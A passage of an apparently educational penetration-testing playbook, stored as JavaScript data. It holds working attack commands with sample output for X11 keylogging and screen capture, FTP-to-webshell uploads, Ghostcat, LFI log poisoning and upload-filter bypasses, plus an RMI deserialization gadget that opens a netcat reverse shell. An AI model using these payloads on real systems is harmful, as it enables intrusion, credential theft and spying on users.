"demo": [{"run": "xwd -root -display <target>:0 -out screen.xwd && convert screen.xwd screen.png && ls -l screen.png", "out": "-rw-r--r-- 1 kali kali 284013 Jan  8 09:14 screen.png", "sig": "screen.png"}], "note": "The PNG is whatever the user has on screen right now, a terminal, a password manager, a document."}, {"t": "Log keystrokes as they are typed", "d": "xspy reads key events from the open display, so passwords the user types next are captured in real time.", "demo": [{"run": "xspy -display <target>:0", "out": "opened <target>:0 for snooping\nssh root@db01\nSummer2024!", "sig": "Summer2024!"}], "note": "A password typed into that session is now yours, no cracking required."}, {"t": "List the open windows", "d": "xdotool enumerates windows on the display, so you know what the user is working in before you capture it.", "demo": [{"run": "DISPLAY=<target>:0 xdotool search --name '.*' getwindowname %@", "out": "Terminal - root@db01\nKeePassXC", "sig": "KeePassXC"}], "note": "An open password manager window is the highest-value thing to screenshot immediately."}]}},
    'ftp-upload-webshell': {"why": "This is the move that turns a boring finding into a shell. Anonymous FTP with write access, on its own, proves almost nothing, you can drop a file, so what. The leap is realising the directory you can write to might be the same directory the web server reads from, which happens whenever a box runs both services out of one home. When that overlap exists, FTP becomes an upload form with no filter: you write a script over FTP and the web server runs it when you request the URL. The discipline is to prove the overlap before you believe in it, write a harmless marker over FTP, fetch it over HTTP, and only once it comes back do you upload the real payload. Reach for it the instant anonymous FTP accepts a file and a web server shares the host.", "cmd": "curl -T proof.txt ftp://10.10.10.10/ --user anonymous:anonymous && curl -s http://10.10.10.10/proof.txt", "tool": "curl", "output": "ftp-webroot-7f3a", "signal": "ftp-webroot-7f3a", "teach": "The marker written over FTP came back over HTTP, so the FTP directory is the web root. Upload shell.php the same way, then browse to it with ?c=id to execute. Match the script language to what the site runs.", "leadup": [{"key": "anon", "label": "Anonymous FTP accepts uploads", "steps": [{"title": "Confirm anonymous login and a write", "tool": "curl", "where": "local", "cmd": "curl -v -T test.txt ftp://<target>/ --user anonymous:anonymous", "out": "> STOR test.txt\n< 150 Ok to send data.\n< 226 Transfer complete.", "sig": "226 Transfer complete.", "teach": "A 226 on an upload means the directory is writable; now you have to prove it is also the web root."}]}, {"key": "web", "label": "A web server shares the host", "steps": [{"title": "The scan found 21 and 80", "tool": "nmap", "where": "local", "cmd": "nmap -p 21,80 <target>", "out": "21/tcp open  ftp\n80/tcp open  http", "sig": "80/tcp open  http", "teach": "FTP and HTTP on one host is the precondition; if their roots overlap, FTP write becomes code execution."}]}], "how": {"lead": "The whole trick is the overlap between FTP write and the web root. Prove it, then exploit it.", "items": [{"t": "See what is already in the FTP root", "d": "List the anonymous FTP directory. index.html, assets, or familiar site files sitting there are a strong hint the FTP root is the web root.", "demo": [{"run": "curl ftp://<target>/ --user anonymous:anonymous", "out": "-rw-r--r-- 1 ftp ftp  1256 Jan 08 index.html\ndrwxr-xr-x 2 ftp ftp  4096 Jan 08 css", "sig": "index.html"}], "note": "The site's own index.html in the FTP root is the tell; confirm it next."}, {"t": "Prove the overlap with a marker", "d": "Write a unique harmless file over FTP, then request it over HTTP. If it comes back, the two directories are the same.", "demo": [{"run": "curl -T marker.txt ftp://<target>/ --user anonymous:anonymous && curl -s http://<target>/marker.txt", "out": "ftp-webroot-7f3a", "sig": "ftp-webroot-7f3a"}], "note": "The marker survived the round trip, so anything you write over FTP is served over HTTP."}, {"t": "Upload a script in the site's language", "d": "Match the payload to what the site runs: .php for PHP, .aspx for IIS, .jsp for Tomcat. The wrong language uploads fine but will not execute.", "demo": [{"run": "curl -v -T shell.php ftp://<target>/ --user anonymous:anonymous", "out": "> STOR shell.php\n< 150 Ok to send data.\n< 226 Transfer complete.", "sig": "226 Transfer complete."}], "note": "The file is uploaded; it only becomes code when the right engine runs it."}, {"t": "Request the script to run it", "d": "Browse to the uploaded file with a command parameter. A returned uid is proof of remote code execution.", "demo": [{"run": "curl \"http://<target>/shell.php?c=id\"", "out": "uid=33(www-data) gid=33(www-data) groups=33(www-data)", "sig": "uid=33(www-data)"}], "note": "www-data running your command is the foothold; upgrade it to a reverse shell next."}]}},

    // ============================ WEB ============================
    'ajp-ghostcat': {"why": "The 8009 port is the one people see and ignore, because it is not a web server you can browse: it is Tomcat's side door for a reverse proxy, and nothing answers when you point a browser at it. That is exactly why it is worth your attention, it was never meant to face you, so it was never hardened against you. What you get depends on the box. At minimum Ghostcat hands you arbitrary file read inside the application, which is how you lift a database password out of a config the web side would never serve. If the application has any upload feature at all, even one that only accepts images, the same bug promotes that file read into running your code, so always check for an upload before you settle for reading files.", "cmd": "python3 ajpShooter.py http://10.10.10.10:8080 8009 /WEB-INF/web.xml read", "tool": "ajpShooter.py", "output": "[<] 200 200\n[<] Content-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<web-app>\n  <context-param>\n    <param-name>dbPassword</param-name>\n    <param-value>S3cr3tP@ss</param-value>\n  </context-param>\n</web-app>", "signal": "    <param-value>S3cr3tP@ss</param-value>", "teach": "Ghostcat read WEB-INF/web.xml, a file the web server itself refuses to serve, and it carried a database password in a context-param. If the app has an upload, point ajpShooter's eval mode at your uploaded file for code execution.", "leadup": [{"key": "scan", "label": "The scan found 8009", "steps": [{"title": "Spot the AJP connector", "tool": "nmap", "where": "local", "cmd": "nmap -p 8009 <target>", "out": "8009/tcp open  ajp13", "sig": "8009/tcp open  ajp13", "teach": "8009 is Tomcat's AJP connector, reachable directly here instead of only from a front-end proxy; that exposure is the whole precondition for Ghostcat."}]}, {"key": "pair", "label": "8009 beside a Tomcat on 8080", "steps": [{"title": "Fingerprint the Tomcat version", "tool": "nmap", "where": "local", "cmd": "nmap -sV -p 8009,8080 <target>", "out": "8009/tcp open  ajp13\n8080/tcp open  http-proxy  Apache Tomcat 9.0.30", "sig": "Apache Tomcat 9.0.30", "teach": "A Tomcat before 9.0.31 / 8.5.51 / 7.0.100 is Ghostcat-vulnerable; the AJP port is how you reach the flaw."}]}], "how": {"lead": "Ghostcat is file read first, code execution only if you can upload. Confirm the connector, read a secret, then check for an upload.", "items": [{"t": "Confirm AJP, not HTTP", "d": "A browser gets nothing from 8009 because it speaks AJP13, not HTTP. Fingerprint it so you know Ghostcat is even possible.", "demo": [{"run": "nmap -sV -p8009 <target>", "out": "8009/tcp open  ajp13  Apache Jserv (Protocol v1.3)", "sig": "ajp13"}], "note": "ajp13 confirmed; now you need a tool that speaks it, since curl cannot."}, {"t": "Read WEB-INF/web.xml", "d": "web.xml is the application's map: servlet mappings, context params, and the names of config files that hold secrets. The web server never serves it, AJP does.", "demo": [{"run": "python3 ajpShooter.py http://<target>:8080 8009 /WEB-INF/web.xml read", "out": "[<] 200 200\n<param-name>dbPassword</param-name>\n<param-value>S3cr3tP@ss</param-value>", "sig": "<param-value>S3cr3tP@ss</param-value>"}], "note": "A database password out of a file the HTTP side would have returned 404 for."}, {"t": "Follow the config it points at", "d": "Chase the references in web.xml to read the real config files (application.properties, context.xml), where the richest secrets live.", "demo": [{"run": "python3 ajpShooter.py http://<target>:8080 8009 /WEB-INF/classes/application.properties read", "out": "[<] 200 200\nspring.datasource.username=appsvc\nspring.datasource.password=Spr1ng!2024", "sig": "spring.datasource.password=Spr1ng!2024"}], "note": "Service-account credentials you now test against SSH, SMB, and the database."}, {"t": "If there is an upload, escalate to RCE", "d": "Ghostcat's eval mode treats a file already on disk as a JSP and runs it. An images-only upload is enough, because the include ignores the extension.", "demo": [{"run": "python3 ajpShooter.py http://<target>:8080 8009 /uploads/avatar.png eval", "out": "[<] 200 200\nuid=997(tomcat) gid=997(tomcat) groups=997(tomcat)", "sig": "uid=997(tomcat)"}], "note": "The uploaded image ran as JSP; you have code execution as the tomcat user."}]}},
    'java-rmi': {"why": "RMI is Java talking to itself across the network, and it is rarely meant to be talking to you. When 1099 is open you have usually found an internal management interface, a JMX endpoint, a custom app server, an EJB backend, that was exposed by accident, and the people who wrote it assumed only trusted Java clients would ever connect. That assumption is the bug. Because RMI moves whole Java objects over the wire and the server deserializes them to use them, feeding it a crafted object runs code during that deserialization, before any real method is even called. Enumerate the registry to learn the bound names and the library versions, then let a tool pick the gadget, because hand-rolling Java serialization while the clock runs is a losing game.", "cmd": "rmg enum 10.10.10.10 1099", "tool": "rmg", "output": "[+] RMI registry bound names:\n[+]   - jmxrmi\n[+]\n[+] RMI registry enumeration:\n[+]   - Registry is vulnerable to deserialization attacks.\n[+]     Vulnerability Status: Vulnerable", "signal": "[+]   - Registry is vulnerable to deserialization attacks.", "teach": "rmg found one bound name (jmxrmi) and reports the registry is vulnerable to deserialization attacks. That is the green light to fire a ysoserial gadget with rmg serial; pick the gadget to match the libraries on the server classpath.", "leadup": [{"key": "scan", "label": "The scan found 1099", "steps": [{"title": "Spot the RMI registry", "tool": "nmap", "where": "local", "cmd": "nmap -p 1099 <target>", "out": "1099/tcp open  java-rmi", "sig": "1099/tcp open  java-rmi", "teach": "1099 is a Java RMI registry; the first move is listing the objects it has bound, because those names are the attack surface."}]}, {"key": "dump", "label": "nmap dumped the registry", "steps": [{"title": "Dump the bound objects", "tool": "nmap", "where": "local", "cmd": "nmap -sV -p 1099 --script rmi-dumpregistry <target>", "out": "1099/tcp open  java-rmi\n| rmi-dumpregistry:\n|   jmxrmi\n|_    javax.management.remote.rmi.RMIServerImpl_Stub", "sig": "jmxrmi", "teach": "A jmxrmi bound name is a JMX management endpoint, a classic RMI foothold; rmg then checks whether it deserializes."}]}], "how": {"lead": "RMI is enumerate, confirm it deserializes, then let a tool build the gadget. Never hand-roll the serialization.", "items": [{"t": "Dump the registry", "d": "nmap's rmi-dumpregistry (or rmg enum) lists the bound names and the classes behind them, so you know what you are attacking.", "demo": [{"run": "nmap -p1099 --script rmi-dumpregistry <target>", "out": "| rmi-dumpregistry:\n|   jmxrmi\n|_    javax.management.remote.rmi.RMIServerImpl_Stub", "sig": "jmxrmi"}], "note": "jmxrmi is a JMX endpoint; note every bound name, each is a possible target."}, {"t": "Scan for the deserialization weakness", "d": "remote-method-guesser's enum mode runs every known RMI check at once: registry deserialization, codebase, and the activator.", "demo": [{"run": "rmg enum <target> 1099", "out": "[+] RMI registry enumeration:\n[+]   - Registry is vulnerable to deserialization attacks.\n[+]     Vulnerability Status: Vulnerable", "sig": "Registry is vulnerable to deserialization attacks."}], "note": "'Vulnerable' means the registry deserializes attacker objects; that is your RCE primitive."}, {"t": "Fire a gadget at a bound name", "d": "rmg serial sends a ysoserial gadget to a bound name. Match the gadget (CommonsCollections and friends) to a library you see on the server's classpath.", "demo": [{"run": "rmg serial <target> 1099 CommonsCollections6 'nc 10.10.14.5 4444 -e /bin/bash' --bound-name jmxrmi", "out": "[+] Creating ysoserial payload... done.\n[+] Sending payload to bound name jmxrmi...\n[+]   Caught ClassCastException, payload probably worked.", "sig": "payload probably worked"}], "note": "The exception is expected: the gadget ran during deserialization before the type check, and your listener catches the shell."}, {"t": "Catch the shell", "d": "The gadget's command was a reverse shell, so have a listener ready on your box before you fire it.", "demo": [{"run": "nc -lvnp 4444", "out": "listening on [any] 4444 ...\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 51022\nid\nuid=1000(appsvc) gid=1000(appsvc)", "sig": "uid=1000(appsvc)"}], "note": "A shell as the service account; RMI deserialization took you from a port to code execution."}]}},
    'vhost-discovery': {
      how: {"lead":"One IP often serves several name-based sites, invisible until you ask for them by name. Fuzz the Host header and keep what differs:","items":[{"t":"Fuzz the Host header","d":"ffuf swaps the Host header through a wordlist against the same IP. Filter by response size to drop the default site and keep the real vhosts.","demo":[{"run":"ffuf -u http://<target> -H \"Host: FUZZ.<target>\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1256","out":"dev                     [Status: 200, Size: 4823]\nportal                  [Status: 200, Size: 3310]","sig":"dev                     [Status: 200, Size: 4823]"}],"note":"A different size from the default page means a distinct virtual host: dev and portal are new surfaces."},{"t":"Add the vhosts to /etc/hosts","d":"Browse a vhost by giving your machine the name. Map the IP to dev.target in /etc/hosts so links, redirects, and assets resolve correctly.","demo":[{"run":"echo \"<target> dev.<target> portal.<target>\" | sudo tee -a /etc/hosts","out":"<target> dev.<target> portal.<target>","sig":"dev.<target>"}],"note":"Now http://dev.<target>/ loads the real site, not the default one."},{"t":"Enumerate each vhost separately","d":"Each virtual host is its own application, so run content discovery against every one; dev and staging sites are often far less hardened.","demo":[{"run":"feroxbuster -u http://dev.<target> -w common.txt","out":"200  GET  /.git/HEAD\n200  GET  /phpinfo.php","sig":"/.git/HEAD"}],"note":"The dev vhost leaks a .git and a phpinfo the production site would never expose."},{"t":"Try common dev names by hand","d":"Short wordlists miss obvious guesses. dev, staging, test, admin, portal, intranet, and git are worth trying by hand even when the fuzz comes up short.","demo":[{"run":"curl -s -H \"Host: staging.<target>\" http://<target>/ | grep -i title","out":"<title>Staging - Internal Build (no auth)</title>","sig":"Staging - Internal Build"}],"note":"A Host you guessed by hand (staging) that the wordlist missed still resolves to its own, less-hardened site."}]},
      leadup: [{"key":"scan","label":"From the port scan","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"See the default site","tool":"curl","where":"local","cmd":"curl -s -I http://<target>/","out":"HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html","sig":"Server: Apache/2.4.41 (Ubuntu)","teach":"One IP often serves several name-based sites; the default page is only the first, so you fuzz the Host header for the rest."}]}],
      why: "One IP can host many sites, and the extra ones are usually where the bugs live: a \"dev\" or \"staging\" vhost is less hardened than the production site everyone tests. Reach for this once you have a domain name (from a TLS certificate, a redirect, or DNS) and the main site looks boring. It is cheap, and it is often the difference between \"stuck on a plain website\" and \"found the real app\". Add every vhost you discover to your hosts file so you can actually browse it.",
      cmd: 'ffuf -u http://10.10.10.10 -H "Host: FUZZ.acme.internal" -w subdomains.txt -mc 200,301,302 -fs 0', tool: 'ffuf',
      output: [
        ':: Method           : GET',
        'dev                     [Status: 200, Size: 5210, Words: 412, Lines: 98]',
        'staging                 [Status: 200, Size: 1840, Words: 95, Lines: 40]',
      ].join('\n'),
      signal: 'staging                 [Status: 200, Size: 1840, Words: 95, Lines: 40]',
      teach: 'One IP can serve many sites by Host header. Fuzzing virtual hosts surfaces ones with no public link, a "staging" or "dev" vhost is usually less hardened than production and is where the bug lives.',
    },
    'content-discovery': {
      how: {"lead":"Content discovery maps the pages and files the links never show you. Pick the right wordlist and settings, then follow what you find:","items":[{"t":"Run a solid baseline","d":"feroxbuster or gobuster with a medium wordlist covers most boxes. Point it at the root and let it recurse into what it finds.","demo":[{"run":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt","out":"200  GET  /index.html\n301  GET  /admin => /admin/\n200  GET  /upload.php\n403  GET  /backup","sig":"200  GET  /upload.php"}],"note":"301s to new directories and 200s on scripts are leads; a 403 often hides something worth a second look."},{"t":"Add the right extensions","d":"A bare wordlist misses files. Add -x php,txt,bak,zip (or asp,aspx on IIS) to catch source, backups, and archives that leak data.","demo":[{"run":"feroxbuster -u http://<target> -w common.txt -x php,bak,zip,txt","out":"200  GET  /config.php.bak\n200  GET  /backup.zip","sig":"/config.php.bak"}],"note":"A .bak of a PHP file serves as plain text, handing you the source and its secrets."},{"t":"Recurse and filter the noise","d":"Recurse into discovered directories, and filter the catch-all response (a soft-404) by size or status so real hits stand out.","demo":[{"run":"feroxbuster -u http://<target> -w common.txt --filter-status 404 --filter-size 1256","out":"200  GET  /admin/\n200  GET  /admin/users.php\n200  GET  /dev/","sig":"/admin/users.php"}],"note":"Filtering the 1256-byte soft-404 leaves only the pages that really exist."},{"t":"Chase the interesting hits","d":"Not all 200s are equal. Admin panels, upload forms, dev/ and backup/ directories, and config files are where the next move lives.","demo":[{"run":"curl -s http://<target>/admin/ | grep -iE 'form|password'","out":"<form action=\"/admin/login.php\" method=\"post\">\n  <input type=\"password\" name=\"pass\">","sig":"/admin/login.php"}],"note":"The admin/ hit is a login form, so it feeds the credential and verb-tampering moves; a backup/ or config hit would feed others."}]},
      leadup: [{"key":"scan","label":"From the port scan","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."}]}],
      why: "A website shows you only what it links to; the interesting things, admin panels, backups, an exposed .git, API routes, are reachable but hidden, and brute-forcing paths is how you find them. This is the single highest-value thing to run against any web app, so start it early and let it work in the background while you look at the site by hand. Your wordlist matters more than the tool: a bigger, smarter list finds what a tiny one walks past.",
      cmd: 'feroxbuster -u http://10.10.10.10 -w raft-medium-directories.txt -o scans/ferox.txt', tool: 'feroxbuster',
      output: [
        '200      GET       24l       68w     /index.php',
        '301      GET        9l       28w     /uploads => http://10.10.10.10/uploads/',
        '200      GET       11l       33w     /admin/login.php',
        '403      GET        9l       28w     /.git',
      ].join('\n'),
      signal: '200      GET       11l       33w     /admin/login.php',
      teach: 'Brute-forcing paths uncovers what is not linked anywhere, an admin login, an uploads directory, a leaking .git. Each hit is a new place to attack; chase the interesting ones (admin, upload, config) first.',
    },
    'param-discovery': {
      how: {"lead":"Hidden parameters are unlinked inputs the app still honours, and unlinked usually means unaudited. Find them, then test each like any other input:","items":[{"t":"Brute-force GET and POST params","d":"arjun throws a parameter wordlist at an endpoint and keeps the ones that change the response, covering GET, POST, and JSON.","demo":[{"run":"arjun -u http://<target>/api/user","out":"[+] Parameter detected: id (GET)\n[+] Parameter detected: debug (GET)","sig":"[+] Parameter detected: debug (GET)"}],"note":"A hidden debug parameter is exactly the kind of forgotten input that leaks data or unlocks features."},{"t":"Test the debug and admin params","d":"Parameters like debug, admin, test, or source often flip the app into a verbose or privileged mode. Set them to 1/true and read the difference.","demo":[{"run":"curl -s \"http://<target>/api/user?id=1&debug=1\"","out":"{\"id\":1,\"name\":\"admin\",\"_sql\":\"SELECT * FROM users WHERE id=1\",\"_role\":\"superadmin\"}","sig":"\"_sql\""}],"note":"debug=1 leaked the raw SQL query and the role field: a map for injection and privilege."},{"t":"Feed each param to the vuln probes","d":"Every discovered parameter is a fresh candidate for SQLi, LFI, SSRF, and command injection. Run the quick probes (a quote, ../, a URL, ;id) against each.","demo":[{"run":"curl -s \"http://<target>/api/user?id=1&file=../../../../etc/passwd\"","out":"root:x:0:0:root:/root:/bin/bash","sig":"root:x:0:0"}],"note":"The hidden file parameter was never meant to be user-facing, and it reads arbitrary files."},{"t":"Mine wordlists from the app","d":"Generic wordlists miss app-specific names. Pull candidate parameters from the site's own JavaScript and HTML (links, forms, data- attributes) for a targeted list.","demo":[{"run":"curl -s http://<target>/static/app.js | grep -oE '[?&][a-zA-Z_]+=' | sort -u","out":"?api_key=\n?debug=\n?redirect=","sig":"?redirect="}],"note":"The app's own JavaScript names redirect, api_key and debug, params a generic list would miss; feed that custom set back to arjun."}]},
      leadup: [{"key":"scan","label":"From content discovery","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Brute-force the paths","tool":"feroxbuster","where":"local","cmd":"feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt","out":"200      GET  /index.html\n200      GET  /product.php\n200      GET  /upload.php","sig":"200      GET  /product.php","teach":"Content discovery maps the real pages; each dynamic one (product.php, upload.php) is a surface to attack in turn."}]}],
      why: "A page can accept parameters that appear nowhere in its HTML, and the hidden one is often the vulnerable one, a leftover debug switch or a \"file\" parameter. Fuzzing parameter names surfaces them so you have something concrete to test for LFI, SQLi, or SSRF. Reach for it when a page looks static but you suspect there is more behind it, or when one known parameter hints at siblings. It turns \"nothing to attack here\" into a list of inputs worth probing.",
      cmd: 'arjun -u http://10.10.10.10/view.php -m GET', tool: 'arjun',
      output: [
        '[*] Scanning http://10.10.10.10/view.php',
        '[*] Analysing HTTP response for anomalies',
        '[+] Parameter detected: page, based on: status code, body length',
      ].join('\n'),
      signal: '[+] Parameter detected: page, based on: status code, body length',
      teach: 'A page can hide inputs that nothing links to. arjun fuzzes parameter names and watches the response change, finding a hidden "page" parameter gives you something to test for LFI, SQLi, or SSRF.',
    },
    'lfi-probe': {
      leadup: [{"key":"pageparam","label":"A page parameter","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Find an include parameter","tool":"arjun","where":"local","cmd":"arjun -u http://<target>/index.php","out":"[+] Parameter detected: page (GET)","sig":"[+] Parameter detected: page (GET)","teach":"A page, file, or include parameter is the local-file-inclusion surface: it names something the server opens for you."}]},{"key":"download","label":"A download feature","steps":[{"title":"Scan the ports","tool":"nmap","where":"local","cmd":"nmap -p- --min-rate 5000 -sV <target>","out":"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","sig":"80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))","teach":"A web server answers on 80, so the attack surface is the application, not the hardened SSH login."},{"title":"Spot a file-serving endpoint","tool":"curl","where":"local","cmd":"curl -s http://<target>/ | grep -iE 'download|view|file='","out":"<a href=\"/download.php?file=report.pdf\">Download report</a>","sig":"file=report.pdf","teach":"A download or view feature that names a file in the URL often reads whatever path you substitute, including traversal."}]}],
      how: {"lead":"A parameter that opens a file on the server reads whatever path you hand it. Prove traversal, pull source with wrappers, then turn a read into code execution:","items":[{"t":"Confirm with traversal","d":"Walk up out of the web root to a file you know exists: /etc/passwd on Linux, windows\\win.ini on Windows. Add ../ until you reach the root; a few extra never hurt.","demo":[{"run":"curl -s \"http://<target>/index.php?page=../../../../etc/passwd\"","out":"root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin","sig":"root:x:0:0"}],"note":"The passwd contents prove arbitrary file read through path traversal."},{"t":"Read PHP source with a filter wrapper","d":"Requesting a .php page executes it, so you see nothing useful. Wrap it in php://filter to base64-encode the source instead, then decode it to read credentials and logic.","demo":[{"run":"curl -s \"http://<target>/index.php?page=php://filter/convert.base64-encode/resource=config\"","out":"PD9waHAgJGRiX3Bhc3MgPSAnUzNjcjN0UGExNSc7ID8+","sig":"PD9waHA"}],"note":"PD9waHA is base64 for <?php; decode the blob to read the source, secrets and all."},{"t":"Execute input with a wrapper","d":"Where allow_url_include is on, point the include at php://input and put PHP in the POST body, or use data://text/plain with a base64 payload. The server runs it.","demo":[{"run":"curl -s \"http://<target>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+\"","out":"uid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)"}],"note":"The data:// wrapper carried a base64 <?php system('id'); ?> that executed."},{"t":"Poison a log, then include it","d":"Write PHP into a file the server logs, your User-Agent landing in access.log is the classic, then include that log through the LFI so the server runs your code.","demo":[{"run":"curl -s -A '<?php system($_GET[0]); ?>' http://<target>/ && curl -s 'http://<target>/index.php?page=../../../../var/log/apache2/access.log&0=id'","out":"uid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)"}],"note":"Your User-Agent was logged; including the log executed it. The classic LFI-to-RCE."},{"t":"Try /proc and session files","d":"No log access? /proc/self/environ sometimes reflects the User-Agent, and PHP session files under /var/lib/php/sessions can carry data you control. Both are include-to-RCE paths.","demo":[{"run":"curl -s \"http://<target>/index.php?page=../../../../proc/self/environ\"","out":"USER=www-data\tHTTP_USER_AGENT=Mozilla/5.0\tPWD=/var/www","sig":"HTTP_USER_AGENT"}],"note":"If environ reflects your User-Agent, a PHP payload placed there runs on include."}]},
      why: "When a parameter names a file to load (page=, file=, include=), it is worth one quick traversal test, because reading arbitrary files is a short path to credentials, source code, and often a shell. The /etc/passwd read is only the proof; the payoff is config files with database passwords and, through log poisoning or PHP wrappers, code execution. Try it on any include-looking parameter. If it works you have a username list and your next several moves at once.",
      cmd: "curl -s 'http://10.10.10.10/view.php?page=../../../../etc/passwd'", tool: 'curl',
      output: [
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'bmurphy:x:1000:1000:Bob Murphy:/home/bmurphy:/bin/bash',
      ].join('\n'),
      signal: 'root:x:0:0:root:/root:/bin/bash',
      teach: 'When /etc/passwd comes back in the page, the "page" parameter reads arbitrary files, Local File Inclusion. It confirms traversal and leaks real usernames (bmurphy); next you try log poisoning or PHP wrappers for code execution.',
    },
    'file-upload': {
      leadup: [
        { key: 'ferox', label: 'Content discovery', steps: [
          { title: 'Scan the ports', tool: 'nmap', where: 'local',
            cmd: 'nmap -p- --min-rate 5000 -sV <target>',
            out: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            sig: '80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            teach: 'A web server answers on 80, so the attack surface is the app itself, not the hardened SSH login.' },
          { title: 'Brute-force the paths', tool: 'feroxbuster', where: 'local',
            cmd: 'feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt',
            out: '200      GET  /index.html\n301      GET  /uploads => http://<target>/uploads/\n200      GET  /upload.php',
            sig: '200      GET  /upload.php',
            teach: 'Content discovery turns up an upload page and the /uploads/ directory it writes to, the exact pair this attack needs.' },
        ] },
        { key: 'browse', label: 'Clicking around', steps: [
          { title: 'Scan the ports', tool: 'nmap', where: 'local',
            cmd: 'nmap -p- --min-rate 5000 -sV <target>',
            out: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            sig: '80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            teach: 'A web server answers on 80, so the attack surface is the app itself, not the hardened SSH login.' },
          { title: 'Spot a form while browsing', tool: 'curl', where: 'local',
            cmd: 'curl -s http://<target>/profile | grep -i enctype',
            out: '<form action="/profile/avatar" method="post" enctype="multipart/form-data">\n  <input type="file" name="avatar" accept="image/*">',
            sig: 'enctype="multipart/form-data"',
            teach: 'No brute-forcing needed here: just using the app, the profile page offers an avatar upload. Any multipart form that takes a file is a candidate, linked or not.' },
        ] },
        { key: 'vhost', label: 'A hidden vhost', steps: [
          { title: 'Scan the ports', tool: 'nmap', where: 'local',
            cmd: 'nmap -p- --min-rate 5000 -sV <target>',
            out: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 (Ubuntu)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            sig: '80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))',
            teach: 'A web server answers on 80, so the attack surface is the app itself, not the hardened SSH login.' },
          { title: 'Fuzz for virtual hosts', tool: 'ffuf', where: 'local',
            cmd: 'ffuf -u http://<target>/ -H "Host: FUZZ.<target>" -w subdomains.txt -fs 1256',
            out: 'portal                  [Status: 200, Size: 4823]\nadmin                   [Status: 200, Size: 3310]',
            sig: 'portal                  [Status: 200, Size: 4823]',
            teach: 'A virtual-host fuzz uncovers an internal portal the default site never serves, and its member area exposes a document upload the public pages hide.' },
        ] },
      ],
      how: {"lead":"The upload almost never just takes your shell. You beat the filter, then make sure the file lands somewhere that actually executes. Pick a trick on the left and watch it play out:","items":[{"t":"Learn the filter type first","d":"A blacklist blocks known-bad extensions (.php, .asp); a whitelist allows only known-good (.jpg, .png). Blacklists are leaky and usually beatable; whitelists need a trick that still counts as allowed. Upload a plain file and read the error so you know which you face.","demo":[{"run":"curl -s -F \"file=@test.php\" http://<target>/upload.php","out":"{\"error\":\"File type not allowed. Allowed: jpg, png, gif\"}","sig":"Allowed: jpg, png, gif"}],"note":"The error tells you it is a whitelist and names what it accepts, so you know which trick to reach for."},{"t":"Try the whole executable-extension family","d":"When .php is blocked the server often still runs .phtml, .php3, .php4, .php5, .php7, .pht or .phar; ASP has .asp, .aspx, .asa, .cer, .cdx; JSP has .jsp, .jspx, .jsw. One of them is usually missing from the blacklist.","demo":[{"run":"curl -s -F \"file=@shell.phtml\" http://<target>/upload.php","out":"{\"status\":\"ok\",\"stored\":\"/uploads/shell.phtml\"}","sig":"/uploads/shell.phtml"},{"run":"curl -s \"http://<target>/uploads/shell.phtml?c=id\"","out":"uid=33(www-data) gid=33(www-data) groups=33(www-data)","sig":"uid=33(www-data)"}],"note":".phtml was not on the blacklist, but the server still runs it as PHP. One request proves execution."},{"t":"Case and trailing tricks","d":"Some filters only match lowercase, so try shell.pHp. Others miss a trailing dot, space, or stream name: shell.php. , 